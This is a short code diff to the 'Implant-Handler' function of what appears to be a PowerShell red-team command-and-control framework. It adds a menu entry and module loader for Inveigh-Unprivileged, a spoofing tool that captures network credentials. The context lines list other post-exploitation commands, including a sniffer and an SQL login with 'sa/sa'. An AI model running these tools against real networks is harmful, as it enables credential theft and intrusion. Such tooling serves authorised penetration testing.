@@ -173,6 +173,7 @@ function Implant-Handler
         Write-Host " Get-PassPol" -ForegroundColor Green
         Write-Host " Get-PassNotExp" -ForegroundColor Green
         Write-Host " Get-LocAdm" -ForegroundColor Green
+        Write-Host " Invoke-InveighUnprivileged -OutputDir C:\Temp\ -FileOutput Y -HTTP Y -NBNS Y -Tool 1" -ForegroundColor Green
         Write-Host " Invoke-Inveigh -OutputDir C:\Temp\ -FileOutput Y -HTTP Y -NBNS Y -Tool 1" -ForegroundColor Green
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
@@ -617,6 +618,10 @@ $error.clear()
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'invoke-psinject-payload',''
                 $pscommand = "invoke-psinject -payloadtype normal $($psargs)"
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-inveighunprivileged'))
+            { 
+                CheckModuleLoaded "Inveigh-Unprivileged.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
             { 
